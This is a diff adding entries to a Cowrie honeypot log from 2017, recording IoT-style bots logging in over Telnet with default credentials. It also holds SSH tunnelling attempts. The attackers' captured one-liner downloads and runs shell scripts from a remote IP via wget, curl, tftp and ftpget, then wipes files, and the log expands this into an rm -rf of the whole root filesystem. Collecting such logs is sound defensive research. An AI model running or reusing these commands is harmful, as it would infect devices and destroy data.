@@ -1759,3 +1759,121 @@
 2017-06-07T11:56:01+0000 [SSHChannel None (81) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8856,91.195.103.217] sending close 81
 2017-06-07T11:56:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8856,91.195.103.217] got channel 'direct-tcpip' request
 2017-06-07T11:56:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8856,91.195.103.217] direct-tcp connection request to 98.138.112.38:25 from localhost:5556
+2017-06-07T11:56:05+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.51.110:45634 (10.8.41.81:2223) [session: TT23785]
+2017-06-07T11:56:05+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.51.110:45636 (10.8.41.81:2223) [session: TT23786]
+2017-06-07T11:56:05+0000 [CowrieTelnetTransport,23785,51.15.51.110] login attempt: 23
+2017-06-07T11:56:05+0000 [CowrieTelnetTransport,23785,51.15.51.110] login return, expect: [admin/admin]
+2017-06-07T11:56:07+0000 [CowrieTelnetTransport,23785,51.15.51.110] login attempt [admin/admin] succeeded
+2017-06-07T11:56:09+0000 [CowrieTelnetTransport,23785,51.15.51.110] Opening TTY Log: log/tty/20170607-115609-None-23785i.log
+2017-06-07T11:56:09+0000 [CowrieTelnetTransport,23785,51.15.51.110] Warning: state changed and new state returned
+2017-06-07T11:56:09+0000 [CowrieTelnetTransport,23786,51.15.51.110] login attempt: 24
+2017-06-07T11:56:09+0000 [CowrieTelnetTransport,23786,51.15.51.110] login return, expect: [admin/admin]
+2017-06-07T11:56:11+0000 [CowrieTelnetTransport,23786,51.15.51.110] login attempt [admin/admin] succeeded
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] Opening TTY Log: log/tty/20170607-115613-None-23786i.log
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] Warning: state changed and new state returned
+2017-06-07T11:56:13+0000 [SSHChannel None (82) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8856,91.195.103.217] remote eof
+2017-06-07T11:56:13+0000 [SSHChannel None (82) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8856,91.195.103.217] remote close
+2017-06-07T11:56:13+0000 [SSHChannel None (82) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8856,91.195.103.217] sending close 82
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23785,51.15.51.110] CMD: sh
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: sh 
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23785,51.15.51.110] CMD: shell
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command not found: shell
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23785,51.15.51.110] CMD: help
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: help 
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23785,51.15.51.110] CMD: busybox
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: busybox 
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] CMD: sh
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: sh 
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] CMD: shell
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command not found: shell
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] CMD: help
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: help 
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] CMD: busybox
+2017-06-07T11:56:13+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: busybox 
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23785,51.15.51.110] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp -g -r armexft.sh 51.15.48.238 21; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: cd /tmp
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: cd /var/run
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: cd /mnt
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: cd /root
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: cd /
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23785,51.15.51.110] Command found: wget http://51.15.48.238/armex.sh
+2017-06-07T11:56:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23786,51.15.51.110] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp -g -r armexft.sh 51.15.48.238 21; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: cd /tmp
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: cd /var/run
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: cd /mnt
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: cd /root
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: cd /
+2017-06-07T11:56:23+0000 [CowrieTelnetTransport,23786,51.15.51.110] Command found: wget http://51.15.48.238/armex.sh
+2017-06-07T11:56:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.48.238/armex.sh
+2017-06-07T11:56:23+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T11:56:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.48.238/armex.sh
+2017-06-07T11:56:23+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T11:56:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 /armex.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh /armex.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: tftp -g -r armexft.sh 51.15.48.238 21
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 armexft.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh armexft.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get tftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.48.238
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: rm -rf /armex.sh tftp1.sh tftp2.sh ftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-07T11:56:23+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 /armex.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh /armex.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: tftp -g -r armexft.sh 51.15.48.238 21
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 armexft.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh armexft.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get tftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.48.238
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: rm -rf /armex.sh tftp1.sh tftp2.sh ftp1.sh
+2017-06-07T11:56:23+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-07T11:56:23+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T11:56:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8860,91.195.103.178] got channel 'direct-tcpip' request
+2017-06-07T11:56:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8860,91.195.103.178] direct-tcp connection request to 77.72.84.184:80 from localhost:5556
+2017-06-07T11:56:38+0000 [SSHChannel None (74) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8860,91.195.103.178] direct-tcp forward to 77.72.84.184:80 with data 'GET /api/checkrealip HTTP/1.1\r\nHost: sapi.rsocks.net\r\nAccept: */*\r\n\r\n'
+2017-06-07T11:56:38+0000 [SSHChannel None (74) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8860,91.195.103.178] failed to connect: Connection refused
+2017-06-07T11:56:38+0000 [SSHChannel None (74) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8860,91.195.103.178] sending close 74
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23785,51.15.51.110] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23785,51.15.51.110] Saved redir contents with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23785,51.15.51.110] Closing TTY Log: log/tty/20170607-115609-None-23785i.log after 33 seconds
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23785,51.15.51.110] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23785,51.15.51.110] Connection lost after 37 seconds
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23786,51.15.51.110] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23786,51.15.51.110] Saved redir contents with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23786,51.15.51.110] Closing TTY Log: log/tty/20170607-115613-None-23786i.log after 30 seconds
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23786,51.15.51.110] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-07T11:56:43+0000 [CowrieTelnetTransport,23786,51.15.51.110] Connection lost after 37 seconds
+2017-06-07T11:56:49+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8855,91.195.103.197] got channel 'direct-tcpip' request
+2017-06-07T11:56:49+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8855,91.195.103.197] direct-tcp connection request to 98.136.217.203:25 from localhost:5556
+2017-06-07T11:57:00+0000 [CowrieTelnetTransport,23784,5.141.32.166] Closing TTY Log: log/tty/20170607-115458-None-23784i.log after 121 seconds
+2017-06-07T11:57:00+0000 [CowrieTelnetTransport,23784,5.141.32.166] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-07T11:57:00+0000 [CowrieTelnetTransport,23784,5.141.32.166] Connection lost after 125 seconds
